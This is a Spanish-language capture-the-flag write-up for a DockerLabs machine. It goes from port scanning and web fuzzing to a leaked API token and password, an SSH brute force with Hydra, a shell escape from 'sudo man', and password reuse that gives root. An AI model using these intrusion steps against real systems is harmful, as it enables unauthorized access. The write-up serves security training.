
<img width="542" height="284" alt="image" src="https://github.com/user-attachments/assets/a3e4df35-e054-429b-8c0e-4dfb60f88217" />


# 📑 Writeup: Máquina DockHackLab 🚀

![OS: Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Platform: DockerLabs](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)
![Dificultad: Media](https://img.shields.io/badge/Dificultad-Media-yellow?style=for-the-badge)


# ESCANEO DE PUERTOS

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
nmap -sCV -p<PORTS> <IP>
```
```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 04:52 EDT
Nmap scan report for thedog.dl (172.17.0.2)
Host is up (0.000049s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 f4:1e:4f:80:e4:25:19:87:a5:2b:e5:fe:b3:16:5d:70 (ECDSA)
|_  256 7d:5a:d8:80:54:05:d2:2f:6f:7f:59:26:4f:6f:83:a8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Servicios de Mantenimiento Inform\xC3\xA1tico
3000/tcp open  http    Node.js Express framework
|_http-title: Error
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.64 seconds
```

Veremos que hay un puerto 80 en el que parece alojar una pagina web y despies veremos un puerto 3000 que tiene un servidor js el cual parece bastante interesante, pero vamos a ver que contiene el puerto 80, si entramos veremos una pagina normal sobre mantenimiento informatico, por lo que vamos a realizar un poco de fuzzing a ver que encontramos.


# Escalate user admin

Ya que tiene un servidor JS vamos a probar a meter como extension .js para ver que nos puede encontrar.

```ruby
gobuster dir -u http://172.17.0.2:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x html,php,js,txt -t 30 -o resultds.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,js
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 2129]
/.html                (Status: 403) [Size: 275]
/api.js               (Status: 200) [Size: 494]
/javascript           (Status: 403) [Size: 275]
/script.js            (Status: 200) [Size: 1916]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================

```

Veremos que nos encuentra un api.js el cual parece bastante interesante, vamos a ver que contiene.

```ruby

const express = require('express');
const app = express();
const PORT = 3000;

const tokenValido = "EKL56L4K57657JÃ‘456J74K5Ã‘6754";

app.use(express.json());

app.post('/api', (req, res) => {
  const { token } = req.body;

  if (token === tokenValido) {
    return res.send("âœ… Acceso concedido. ContraseÃ±a chocolate123");
  } else {
    return res.status(401).send("âŒ Token invÃ¡lido.");
  }
});

app.listen(PORT, () => {
  console.log(`ðŸš€ API
activa en http://localhost:${PORT}`);
});
```
Veremos que es un endpoint que parece ser de Flask en el que tiene como parametro el /api para realizar la conexion y con una clave secreta llamada EKL56L4K57657JÃ‘456J74K5Ã‘6754, tambien vemos que cuando funciona nos porporciona una contraseña llamada chocolate123, y la API esta activa en el puerto 3000 por lo que vemos.

Igualmente si nosotros lo hubieramos echo de esta forma:

```ruby
curl -X POST http://<IP>:3000/api \
  -H 'Content-Type: application/json' \
  -d '{"token":"EKL56L4K57657JÑ456J74K5Ñ6754"}'
```
Ahora vamos a ver si con esa contraseña hay algun usuario en el sistema que contenga dicha contraseña, por lo que vamos a realizar un ataque de fuerza bruta de esta forma:

# HYDRA
```ruby
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-07 05:05:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 624370 login tries (l:624370/p:1), ~9756 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: admin   password: chocolate123
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Veremos que ha funcionado y hemos encontrado las credenciales del usuario admin por lo que vamos a conectarnos por SSH.

# SSH
```ruby
ssh admin@<IP>
```

#Escalate user balulito

Si hacemos sudo -l veremos lo siguiente:

```bash
Matching Defaults entries for admin on b510a27bba00:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User admin may run the following commands on b510a27bba00:
    (balulito) NOPASSWD: /usr/bin/man
```
Vemos que podemos ejecutar el binario man como el usuario balulito por lo que haremos lo siguiente:
```bash
sudo -u balulito man man
!/bin/bash
```
Info:
```bash
balulito@b510a27bba00:/home/admin$ whoami
balulito
```

# Escalate Privileges
Vemos que con este usuario no podemos hacer practicamente nada, despues de buscar un rato largo, vamos a probar a reutilizar la contraseña de root con la que utilizamos para el usuario admin.
```bash
su root
```
Metemos como contraseña chocolate123 y veremos que estaremos dentro.

Info:
```bash
root@b510a27bba00:/home/admin# whoami
root
```
Veremos que ya seremos el usuario root por lo que habremos terminado la maqu
